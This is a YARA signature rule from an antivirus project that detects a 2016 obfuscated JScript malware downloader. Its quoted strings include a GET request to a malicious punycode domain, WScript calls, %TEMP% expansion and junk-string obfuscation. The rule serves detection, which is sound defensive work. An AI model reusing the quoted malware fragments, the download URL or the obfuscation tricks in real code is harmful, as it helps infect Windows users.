rule sig_20160428_32f2386f0fbbb1853a485220033ccfa5 {
  meta:
    description = "datamaliciousorder - file 20160428_32f2386f0fbbb1853a485220033ccfa5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b3ab7cc0f28134c0a17293e5541a4e42580e259ea8a69a28e66f8a7c2e8f8bc7"

  strings:
    $s1  = "OvlWpdSniOnkSbhJgcKgk[McqYtvPbnSkfEwbQpnNkz](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "function PfiGpgDvxOvlYkgLocUju(DqhSnfTpcRuqBupNxnLks){VxtSqqSmdLneRdvTnaYip[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PfiGpgDvxOvlYkgLocUju(DqhSnfTpcRuqBupNxnLks){VxtSqqSmdLneRdvTnaYip[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return PosMcsTlsYrjMjrGypQcw - VvzSypXwoUtwLptVqbIqg;};" fullword ascii
    $s5  = "var VxtSqqSmdLneRdvTnaYip = function PcyYbtKspXwqWynCwdHyq() {return RrfYgnDcsStkWsrAvtWmf[QqaYdzJxgVtxCtvPiiUpo](\"WScript\"+\"" ascii
    $s6  = "function NzzBvmJtiAzwFrjMzvQyu(PosMcsTlsYrjMjrGypQcw, VvzSypXwoUtwLptVqbIqg){AmuQmeJpgHfsQaeWhvRlv = AmuQmeJpgHfsQaeWhvRlv * 1; " ascii
    $s7  = "var VxtSqqSmdLneRdvTnaYip = function PcyYbtKspXwqWynCwdHyq() {return RrfYgnDcsStkWsrAvtWmf[QqaYdzJxgVtxCtvPiiUpo](\"WScript\"+\"" ascii
    $s8  = "var RrfYgnDcsStkWsrAvtWmf = this[\"WScript\"];" fullword ascii
    $s9  = "function OopNcaAatUuaFzxDdlJdq() {return VxtSqqSmdLneRdvTnaYip[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function NzzBvmJtiAzwFrjMzvQyu(PosMcsTlsYrjMjrGypQcw, VvzSypXwoUtwLptVqbIqg){AmuQmeJpgHfsQaeWhvRlv = AmuQmeJpgHfsQaeWhvRlv * 1; " ascii
    $s11 = "function EsgHlaVvpTznGcyVwkVtv(){return LivVtdQkjIxsKubQhtNkz + \"\";};" fullword ascii
    $s12 = "if (OvlWpdSniOnkSbhJgcKgk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function YkaQkdAazOswUfsEbuQgn() {return ((WtfRncFtvXabGckBtfWzz == true) && (WtfRncFtvXabGckBtfWzz == LmwDtaObsOfaOthQxqNom)) ?" ascii
    $s14 = "function YkaQkdAazOswUfsEbuQgn() {return ((WtfRncFtvXabGckBtfWzz == true) && (WtfRncFtvXabGckBtfWzz == LmwDtaObsOfaOthQxqNom)) ?" ascii
    $s15 = "function OopNcaAatUuaFzxDdlJdq() {return VxtSqqSmdLneRdvTnaYip[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s16 = "return NzzBvmJtiAzwFrjMzvQyu(1 == 1 ? XzxMzvCdjQebGmgIgpKbh : 0, 1 == 1 ? IxjYkyIwuCejQrjTfmWkl : 0);" fullword ascii
    $s17 = "function MrjPxzJjxNffQjyTtqMlb()" fullword ascii
    $s18 = "MdeIgbRtcOdvBayMnxDnq = true;" fullword ascii
    $s19 = "var LmwDtaObsOfaOthQxqNom = false;" fullword ascii
    $s20 = "function EyrDeqAprTubAjmUklUos(){return QqaYdzJxgVtxCtvPiiUpo;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}